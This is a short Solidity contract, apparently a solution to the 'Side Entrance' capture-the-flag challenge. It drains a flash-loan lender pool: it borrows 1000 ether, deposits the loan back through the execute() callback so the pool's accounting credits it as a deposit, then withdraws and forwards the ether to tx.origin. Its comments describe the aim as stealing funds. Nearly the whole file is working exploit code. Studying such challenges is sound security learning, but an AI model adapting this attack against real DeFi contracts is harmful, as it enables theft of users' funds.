pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract attackSideEntrance {
    SideEntranceLenderPool public pool;

    constructor(address _addressPool) {
        pool = SideEntranceLenderPool(_addressPool);
    }


    function execute() external payable {
        // deposit in pool
        pool.deposit{value: 1000 ether}();
    }

    // call flashloan and steal funds
    function attack() external payable {
        // flash loan will call to execute
        // from execute it will return balance 
        pool.flashLoan(1000 ether);

        // internal accounting will think we deposited 1000 ether
        pool.withdraw();
    }

    receive() external payable {
        payable(tx.origin).transfer(msg.value);
    }

}
